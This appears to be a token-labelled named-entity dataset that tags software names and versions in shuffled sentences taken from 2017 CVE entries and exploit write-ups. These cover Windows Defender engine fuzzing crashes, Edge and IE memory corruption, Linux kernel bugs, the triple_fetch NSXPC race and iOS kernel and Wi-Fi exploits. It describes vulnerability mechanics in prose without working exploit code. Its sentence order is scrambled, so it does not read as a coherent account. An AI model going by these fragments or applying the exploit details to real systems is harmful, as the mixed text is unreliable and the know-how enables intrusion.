testcase O
, O
renamed O
testcase.txt O
. O

Note O
that O
as O
soon O
as O
the O
testcase.txt O
file O
touches O
disk O
, O
it O
will O
immediately O
crash O
the O
MsMpEng O
service O
on O
Windows O
, O
which O
may O
destabilize O
your O
system O
. O

I O
asked O
Microsoft O
if O
this O
was O
intentionally O
exposed O
, O
and O
they O
replied O
The O
apicall O
instruction O
is O
exposed O
for O
multiple O
reasons O
, O
so O
this O
is O
intentional O
. O

Here O
is O
a O
better O
testcase O
that O
crashes O
in O
a O
memcpy O
to O
a O
bad O
destination O
offset O
. O

Following O
frames O
may O
be O
wrong O
. O

db6625e8 O

I O
took O
a O
quick O
stab O
at O
writing O
a O
fuzzer O
and O
immediately O
found O
heap O
corruption O
in O
the O
KERNEL32.DLL O
! O
VFS_Write O
API O
, O
I O
suspect O
this O
has O
never O
been O
fuzzed O
before O
. O

This O
is O
a O
very O
powerful O
exploit O
primitive O
, O
and O
exploitation O
does O
not O
seem O
difficult O
. O

Microsoft O
MsMpEng O
- O
mpengine O
x86 O
Emulator O
Heap O
Corruption O
in O
VFS O
API O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
obtain O
information O
to O
further O
compromise O
the O
user O
system O
when O
Microsoft O
Edge O
improperly O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8499 O
, O
CVE-2017-8520 O
, O
CVE-2017-8521 O
, O
and O
CVE-2017-8548 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8499 O
, O
CVE-2017-8520 O
, O
CVE-2017-8521 O
, O
and O
CVE-2017-8549 O
. O

Microsoft O
Edge O
Chakra O
- O
Incorrect O
JIT O
Optimization O
with O
TypedArray O
Setter O
2 O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8519 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
and O
Windows SN
Server SV
2012 SV
and SV
R2 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
Internet O
Explorer O
improperly O
accesses O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Malware O
Protection O
Engine O
running O
on O
Microsoft O
Forefront O
and O
Microsoft O
Defender O
on O
Microsoft SN
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
8.1 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
, O
Microsoft SN
Exchange SN
Server SV
2013 SV
and SV
2016 SV
, O
does O
not O
properly O
scan O
a O
specially O
crafted O
file O
leading O
to O
memory O
corruption O
. O

aka O
Microsoft O
Malware O
Protection O
Engine O
Remote O
Code O
Execution O
Vulnerability O
, O
a O
different O
vulnerability O
than O
CVE-2017-8538 O
and O
CVE-2017-8540 O
. O

Microsoft O
MsMpEng O
- O
Use-After-Free O
via O
Saved O
Callers O

aka O
Microsoft O
Malware O
Protection O
Engine O
Remote O
Code O
Execution O
Vulnerability O
, O
a O
different O
vulnerability O
than O
CVE-2017-8538 O
and O
CVE-2017-8541 O
. O

Microsoft O
MsMpEng O
- O
Remote O
Use-After-Free O
Due O
to O
Design O
Issue O
in O
GC O
Engine O

aka O
Microsoft O
Malware O
Protection O
Engine O
Remote O
Code O
Execution O
Vulnerability O
, O
a O
different O
vulnerability O
than O
CVE-2017-8540 O
and O
CVE-2017-8541 O
. O

Attached O
is O
a O
ZIP O
archive O
( O
password O
: O
mpengbugs O
) O
with O
up O
to O
3 O
testcases O
for O
each O
of O
the O
9 O
unique O
crashes O
. O

We O
have O
verified O
that O
all O
listed O
crashes O
occur O
on O
Windows SN
7 SV
as O
soon O
as O
an O
offending O
sample O
is O
saved O
to O
disk O
and O
discovered O
by O
MsMpEng O
. O

Through O
fuzzing O
, O
we O
have O
discovered O
a O
number O
of O
ways O
to O
crash O
the O
service O
( O
and O
specifically O
code O
in O
the O
mpengine.dll O
module O
) O
, O
by O
feeding O
it O
with O
malformed O
input O
testcases O
to O
scan O
. O

For O
corruption_1-2 O
, O
the O
PageHeap O
mechanism O
must O
be O
enabled O
for O
the O
MsMpEng.exe O
program O
in O
order O
to O
reliably O
observe O
the O
unhandled O
exception O
. O

netvm_parse_routine_netinvoke_handle_t O
| O
Different O
crashes O
with/out O
PageHeap O
. O

invalid O
read O
. O

On O
the O
other O
hand O
, O
null_1-4 O
, O
div_by_zero O
and O
recursion O
are O
low O
severity O
bugs O
that O
can O
only O
be O
used O
to O
bring O
the O
service O
process O
down O
. O

corruption_3 O
| O
Unspecified O
memory O
corruption O
( O
) O

corruption_2 O
| O
Heap O
corruption O
| O
PageHeap O
for O
MpMsEng.exe O
free O
( O
) O
called O
by O
CRsaPublicKey O
Decrypt_uchar O
| O
May O
crash O
in O
other O
ways O
, O
e.g O
. O

Microsoft O
MsMpEng O
- O
Multiple O
Crashes O
While O
Scanning O
Malformed O
Files O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engines O
fail O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
browsers O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8517 O
and O
CVE-2017-8522 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8517 O
and O
CVE-2017-8524 O
. O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engines O
fail O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
browsers O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
Edge O
JavaScript O
scripting O
engine O
fails O
to O
handle O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8499 O
, O
CVE-2017-8520 O
, O
CVE-2017-8548 O
, O
and O
CVE-2017-8549 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8499 O
, O
CVE-2017-8521 O
, O
CVE-2017-8548 O
, O
and O
CVE-2017-8549 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
and O
Windows SN
Server SV
2012 SV
and SV
R2 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
Internet O
Explorer O
improperly O
accesses O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8547 O
. O

Microsoft O
Edge O
allows O
a O
remote O
code O
execution O
vulnerability O
due O
to O
the O
way O
it O
accesses O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8522 O
and O
CVE-2017-8524 O
. O

Microsoft O
browsers O
in O
Microsoft SN
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
and SV
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
the O
JavaScript O
engines O
fail O
to O
render O
when O
handling O
objects O
in O
memory O
in O
Microsoft O
browsers O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8501 O
. O

Microsoft O
Office O
allows O
a O
remote O
code O
execution O
vulnerability O
due O
to O
the O
way O
that O
it O
handles O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8520 O
, O
CVE-2017-8521 O
, O
CVE-2017-8548 O
, O
and O
CVE-2017-8549 O
. O

Microsoft O
Edge O
in O
Windows SN
10 SV
1607 SV
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
when O
Microsoft O
Edge O
improperly O
accesses O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8496 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8497 O
. O

The O
vulnerability O
has O
been O
confirmed O
on O
Windows SN
10 SV
Enterprise SV
64-bit O
( O
OS O
version O
1607 O
, O
OS O
build O
14393.1198 O
) O
and O
Microsoft SN
Edge SN
38.14393.1066.0 SV
, O
Microsoft SN
EdgeHTML SN
14.14393 SV
. O

drivers/net/usb/catc.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
before SV
4.9.11 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

As O
noted O
, O
the O
commit O
below O
doesn O
t O
fix O
the O
mmap O
side O
. O

CONFIG_STRICT_DEVMEM O
exists O
to O
prevent O
userland O
from O
directly O
modifying O
kernel O
memory O
, O
yet O
the O
kernel O
will O
happily O
make O
slab O
allocations O
in O
allowed O
regions O
below O
1MB O
. O

I O
say O
this O
because O
the O
commit O
message O
makes O
no O
mention O
of O
this O
partially O
fixing O
a O
CONFIG_STRICT_DEVMEM O
bypass O
( O
and O
I O
suppose O
a O
Secure O
Boot O
bypass O
, O
but O
what O
isn O
t O
these O
days O

CONFIG_STRICT_DEVMEM O
explicitly O
allowed O
both O
reads O
and O
writes O
to O
these O
allocations O
. O

) O
, O
and O
similarly O
makes O
no O
mentions O
of O
the O
modifications O
it O
makes O
to O
the O
write O
side O
. O

Subject O
: O
Silently O
( O
or O
obliviously O
) O
partially-fixed O
CONFIG_STRICT_DEVMEM O
bypass O

drivers/net/usb/rtl8150.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
before SV
4.9.11 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/net/usb/pegasus.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
before SV
4.9.11 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/char/virtio_console.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
before SV
4.10.12 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/net/can/usb/gs_usb.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
before SV
4.10.2 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

crypto/ccm.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
through SV
4.10.12 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/media/usb/dvb-usb-v2/dvb_usb_core.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
before SV
4.10.12 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/media/usb/dvb-usb/dw2102.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
before SV
4.10.4 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

drivers/media/usb/dvb-usb/dvb-usb-firmware.c O
in O
the O
Linux SN
kernel SN
4.9.x SV
and SV
4.10.x SV
before SV
4.10.7 SV
interacts O
incorrectly O
with O
the O
CONFIG_VMAP_STACK O
option O
, O
which O
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
or O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
use O
of O
more O
than O
one O
virtual O
page O
for O
a O
DMA O
scatterlist O
. O

This O
vulnerability O
occurs O
when O
fill O
settings O
are O
intentionally O
malformed O
and O
is O
opened O
in O
a O
standalone O
state O
, O
without O
connection O
to O
a O
protection O
relay O
. O

All O
versions O
of O
VAMPSET SN
software O
produced O
by O
Schneider O
Electric O
, O
prior SV
to SV
V2.2.189 SV
, O
are O
susceptible O
to O
a O
memory O
corruption O
vulnerability O
when O
a O
corrupted O
vf2 O
file O
is O
used O
. O

This O
vulnerability O
causes O
the O
software O
to O
halt O
or O
not O
start O
when O
trying O
to O
open O
the O
corrupted O
file O
. O

As O
Windows O
operating O
system O
remains O
operational O
and O
VAMPSET O
responds O
, O
it O
is O
able O
to O
be O
shut O
down O
through O
its O
normal O
closing O
protocol O
. O

This O
attack O
is O
not O
considered O
to O
be O
remotely O
exploitable O
. O

This O
vulnerability O
has O
no O
effect O
on O
the O
operation O
of O
the O
protection O
relay O
to O
which O
VAMPSET O
is O
connected O
. O

Memory O
Corruption O
Vulnerability O
in O
Foxit SN
PDF SN
Toolkit SN
before SV
2.1 SV
allows O
an O
attacker O
to O
cause O
Denial O
of O
Service O
& O
Remote O
Code O
Execution O
when O
a O
victim O
opens O
a O
specially O
crafted O
PDF O
file O
. O

The O
issue O
involves O
the O
IOAcceleratorFamily O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
Mach-O O
file O
. O

Xcode SN
before SV
9 SV
is O
affected O
. O

The O
issue O
involves O
the O
ld64 O
component O
. O

Safari SN
before SV
11 SV
is O
affected O
. O

tvOS SN
before SV
11 SV
is O
affected O
. O

iCloud SN
before SV
7.0 SV
on O
Windows O
is O
affected O
. O

iTunes SN
before SV
12.7 SV
on O
Windows O
is O
affected O
. O

iOS SN
before SV
11 SV
is O
affected O
. O

The O
issue O
involves O
the O
Wi-Fi O
component O
. O

It O
might O
allow O
remote O
attackers O
to O
execute O
arbitrary O
code O
in O
a O
privileged O
context O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
crafted O
Wi-Fi O
traffic O
that O
leverages O
a O
race O
condition O
. O

Moreover O
, O
this O
version O
of O
hostapd O
is O
instrumented O
to O
add O
various O
commands O
, O
allowing O
injection O
and O
reception O
of O
crafted O
action O
frames O
used O
throughout O
the O
exploit O
. O

This O
version O
of O
hostapd O
is O
configured O
to O
support O
802.11k O
RRM O
, O
and O
in O
particular O
Neighbor O
Reports O
. O

To O
run O
the O
exploit O
against O
different O
devices O
or O
versions O
, O
the O
symbols O
must O
be O
adjusted O
. O

The O
attached O
archive O
contains O
the O
following O
directories O
: O
-hostapd-2.6 O
- O
A O
modified O
version O
of O
hostapd O
utilised O
in O
the O
exploit O
. O

-OneRing O
- O
The O
exploit O
itself O
. O

You O
can O
utilise O
this O
R/W O
access O
by O
calling O
the O
read_host_dword O
and O
write_host_dword O
functions O
, O
respectively O
. O

This O
exploit O
has O
been O
tested O
on O
the O
iPhone SN
7 SV
, O
iOS SN
10.2 SV
( O
14C92 SV
) O
. O

Apple SN
iOS SN
10.2 SV
( O
14C92 O
) O
- O
Remote O
Code O
Execution O

watchOS SN
before SV
4 SV
is O
affected O
. O

macOS SN
before SV
10.13 SV
is O
affected O
. O

It O
might O
allow O
remote O
attackers O
to O
execute O
arbitrary O
code O
in O
a O
privileged O
context O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
crafted O
Wi-Fi O
traffic O
. O

The O
issue O
involves O
the O
Mail O
MessageUI O
component O
. O

It O
allows O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
image O
. O

The O
issue O
involves O
the O
IOFireWireFamily O
component O
. O

iOS SN
before SV
10.3.3 SV
is O
affected O
. O

watchOS SN
before SV
3.2.3 SV
is O
affected O
. O

tvOS SN
before SV
10.2.2 SV
is O
affected O
. O

macOS SN
before SV
10.12.6 SV
is O
affected O
. O

iCloud SN
before SV
6.2.2 SV
on O
Windows O
is O
affected O
. O

iTunes SN
before SV
12.6.2 SV
on O
Windows O
is O
affected O
. O

Safari SN
before SV
10.1.2 SV
is O
affected O
. O

So O
in O
this O
case O
the O
condition O
is O
not O
satisfied O
, O
the O
arguments O
object O
created O
by O
the O
following O
code O
( O
CreateDirectArguments O
in O
the O
PoC O
) O
may O
have O
uninitialized O
values O
and O
length O
. O

The O
issue O
involves O
the O
Bluetooth O
component O
. O

The O
issue O
involves O
the O
libxpc O
component O
. O

That O
bplist16 O
buffer O
gets O
sent O
in O
an O
xpc O
message O
as O
an O
xpc_data O
object O
. O

This O
is O
a O
race O
condition O
so O
you O
may O
have O
to O
run O
the O
PoC O
multiple O
times O
( O
./run.sh O
) O
and O
also O
use O
libgmalloc O
to O
see O
the O
corruption O
directly O
rather O
than O
its O
effects O
. O

The O
most O
direct O
path O
to O
trigger O
memory O
controlled O
memory O
corruption O
is O
to O
use O
a O
type O
signature O
like O
this O
: O
@ O
ABCD O
That O
will O
cause O
7 O
bytes O
of O
buffer O
space O
to O
be O
allocated O
for O
the O
parsed O
signature O
( O
which O
will O
just O
contain O
a O
copy O
of O
the O
string O
. O
) O

NSXPC O
is O
widely O
used O
across O
privilege O
boundaries O
. O

In O
this O
PoC O
I O
target O
NSXPC O
, O
a O
high-level O
RPC O
mechanism O
which O
uses O
XPC O
for O
its O
low-level O
transport O
layer O
. O

If O
we O
change O
the O
types O
represented O
by O
the O
signature O
string O
( O
which O
is O
in O
shared O
memory O
) O
between O
these O
two O
calls O
we O
can O
cause O
the O
parsing O
code O
to O
write O
out O
of O
bounds O
as O
it O
assumes O
that O
the O
length O
computed O
by O
NSGetSizeAndAlignment O
is O
correct O
. O

NSXPCDecoder O
is O
implemented O
in O
Foundation O
. O

This O
method O
is O
implemented O
in O
CoreFoundation O
. O

This O
function O
calls O
NSGetSizeAndAlignment O
to O
determine O
the O
size O
of O
a O
buffer O
required O
to O
parse O
the O
signature O
string O
which O
NSMS1 O
then O
allocates O
using O
calloc O
before O
parsing O
the O
signature O
string O
into O
the O
allocated O
buffer O
. O

You O
should O
just O
hard O
reboot O
the O
device O
and O
try O
again O
. O

This O
project O
exploits O
CVE-2017-7047 O
to O
build O
a O
proof-of-concept O
remote O
lldb O
debugserver O
stub O
capable O
of O
attaching O
to O
and O
allowing O
the O
remote O
debugging O
all O
userspace O
processes O
on O
iOS SN
10.0 SV
to SV
10.3.2 SV
. O

Please O
see O
the O
README O
in O
the O
nsxpc2pc O
folder O
in O
the O
attached O
archive O
for O
further O
discussion O
and O
details O
. O

This O
PoC O
targets O
the O
airportd O
daemon O
which O
runs O
as O
root O
but O
should O
work O
for O
any O
NSXPC O
service O
. O

If O
you O
take O
a O
look O
at O
the O
xcode O
stdout/debugger O
window O
you O
can O
see O
some O
more O
status O
information O
. O

Clients O
send O
serialized O
NSInvocation O
objects O
representing O
the O
methods O
they O
wish O
to O
call O
on O
the O
remote O
objects O
. O

NSXPCDecoder O
wraps O
the O
bplist16 O
deserialization O
and O
for O
selectors O
such O
as O
decodeCStringForKey O
: O
, O
if O
the O
key O
is O
present O
, O
the O
value O
returned O
will O
be O
a O
pointer O
directly O
into O
the O
xpc_data O
object O
in O
which O
it O
was O
received O
. O

It O
may O
take O
a O
couple O
of O
attempts O
but O
it O
should O
work O
. O

Consumers O
of O
xpc O
messages O
did O
not O
seem O
to O
expect O
that O
the O
backing O
buffers O
of O
xpc_data O
objects O
could O
be O
modified O
by O
the O
sender O
whilst O
being O
processed O
by O
the O
receiver O
. O

Once O
the O
debugserver O
is O
running O
it O
should O
be O
stable O
. O

By O
crafting O
our O
own O
memory O
entry O
object O
this O
means O
the O
pointers O
returned O
by O
decodeCStringForKey O
: O
actually O
point O
into O
shared O
memory O
which O
can O
still O
be O
modified O
by O
the O
caller O
. O

These O
NSInvocations O
are O
serialized O
using O
the O
NSSecureCoding O
method O
which O
ends O
up O
creating O
a O
bplist16 O
serialized O
byte O
stream O
. O

triple_fetch O
- O
ianbeer O
This O
is O
an O
exploit O
for O
CVE-2017-7047 O
, O
a O
logic O
error O
in O
libxpc O
which O
allowed O
malicious O
message O
senders O
to O
send O
xpc_data O
objects O
that O
were O
backed O
by O
shared O
memory O
. O

So O
JSDOMWindow O
: O
:getPrototype O
which O
checks O
the O
Same O
Origin O
Policy O
is O
not O
called O
. O

The O
issue O
involves O
the O
Foundation O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
file O
. O

The O
issue O
involves O
the O
AppleGraphicsPowerManagement O
component O
. O

The O
issue O
involves O
the O
WebKit O
Page O
Loading O
component O
. O

void O
flush O
( O
InlineStackEntry O
inlineStackEntry O
if O
( O
m_graph.needsScopeRegister O
( O
) O
) O
flush O
( O
m_codeBlock- O
> O
scopeRegister O
( O
) O
) O
; O
( O
a O
) O
} O
At O
( O
a O
) O
, O
it O
should O
flush O
the O
scope O
register O
of O
|inlineStackEntry- O
> O
m_codeBlock| O
instead O
of O
|m_codeBlock| O
. O

As O
a O
result O
, O
the O
scope O
register O
of O
|inlineStackEntry- O
> O
m_codeBlock| O
may O
have O
an O
incorrect O
offset O
in O
the O
stack O
layout O
phase O
. O

The O
issue O
involves O
the O
afclip O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
audio O
file O
. O

The O
issue O
involves O
the O
Audio O
component O
. O

It O
allows O
remote O
attackers O
to O
obtain O
sensitive O
information O
from O
process O
memory O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
audio O
file O
. O

The O
issue O
involves O
the O
WebKit O
Web O
Inspector O
component O
. O

The O
issue O
involves O
the O
IOUSBFamily O
component O
. O

The O
issue O
involves O
the O
CoreAudio O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
movie O
file O
. O

iOS SN
before SV
10.3.2 SV
is O
affected O
. O

The O
issue O
involves O
the O
AVEVideoEncoder O
component O
. O

tvOS SN
before SV
10.2.1 SV
is O
affected O
. O

watchOS SN
before SV
3.2.2 SV
is O
affected O
. O

Sources O
: O
iOS SN
kernel O
exploit O
designated O
to O
work O
on O
all O
64-bit O
iOS O
devices O
< SV
= SV
10.3.1 SV
More O
general O
information O
modifications O
for O
other O
iOS O
devices O
Like O
a O
lot O
( O
if O
not O
most O
) O
of O
the O
iOS O
kernel O
exploits O
, O
this O
also O
requires O
offsets O
for O
each O
iOS O
device O
and O
version O
. O

This O
is O
a O
crucial O
part O
in O
a O
Jailbreak O
chain O
, O
but O
this O
never O
aimed O
to O
become O
a O
Jailbreak O
. O

Is O
it O
a O
Jailbreak O

Is O
this O
going O
to O
be O
a O
jailbreak O

Fortunately O
, O
Sandbox O
escape O
exploits O
have O
been O
released O
by O
P0 O
, O
which O
means O
this O
can O
be O
used O
to O
completely O
compromise O
a O
kernel O
, O
and O
a O
step O
towards O
a O
full O
jailbreak O
. O

Maybe O
, O
if O
someone O
wants O
to O
work O
on O
that O
Credits O
Credit O
for O
finding O
the O
vulnerabilities O
, O
chaining O
them O
together O
, O
writing O
the O
exploit O
go O
to O
Adam O
Donenfeld O
( O
@ O
doadam O
) O
. O

Those O
will O
be O
posted O
in O
the O
close O
future O
( O
when O
I O
get O
more O
time O
) O
but O
should O
be O
acquired O
from O
AppleAVEDriver O
( O
you O
can O
get O
a O
hint O
on O
the O
offsets O
from O
the O
comments O
above O
them O
) O
. O

Sandbox O
escape O
Like O
mentioned O
, O
AppleAVEDriver O
direct O
access O
requires O
sandbox O
escape O
( O
either O
mediaserverd O
sandbox O
context O
or O
no O
sandbox O
at O
all O
) O
. O

Special O
thanks O
to O
Zuk O
Avraham O
( O
@ O
ihackbanme O
) O
, O
Yaniv O
Karta O
( O
@ O
shokoluv O
) O
and O
the O
rest O
of O
the O
Zimperium O
team O
for O
the O
opportunity O
( O
and O
the O
paycheck O
) O
. O

Apple SN
iOS SN
< SV
10.3.1 SV
- O
Kernel O

macOS SN
before SV
10.12.5 SV
is O
affected O
. O

The O
issue O
involves O
the O
SQLite O
component O
. O

It O
allows O
attackers O
to O
conduct O
sandbox-escape O
attacks O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
app O
. O

The O
issue O
involves O
the O
iBooks O
component O
. O

The O
issue O
involves O
the O
NVIDIA O
Graphics O
Drivers O
component O
. O

iTunes SN
before SV
12.6.1 SV
on O
Windows O
is O
affected O
. O

Safari SN
before SV
10.1.1 SV
is O
affected O
. O

inline O
Butterfly O
tryCreateArrayButterfly O
( O
VM O
& O
vm O
, O
JSCell O
intendedOwner O
, O
unsigned O
initialLength O
) O
{ O
Butterfly O
butterfly O
= O
Butterfly O
: O
:tryCreate O
( O
vm O
, O
intendedOwner O
, O
0 O
, O
0 O
, O
true O
, O
baseIndexingHeaderForArrayStorage O
( O
initialLength O
) O
, O
ArrayStorage O
: O
:sizeFor O
( O
BASE_ARRAY_STORAGE_VECTOR_LEN O
) O
) O
; O
if O
( O
! O
butterfly O
) O
return O
nullptr O
; O
ArrayStorage O
storage O
= O
butterfly- O
> O
arrayStorage O
( O
) O
; O
storage- O
> O
m_sparseMap.clear O
( O
) O
; O
storage- O
> O
m_indexBias O
= O
0 O
; O
storage- O
> O
m_numValuesInVector O
= O
0 O
; O
return O
butterfly O
; O
} O
It O
allocates O
a O
fixed O
size O
( O
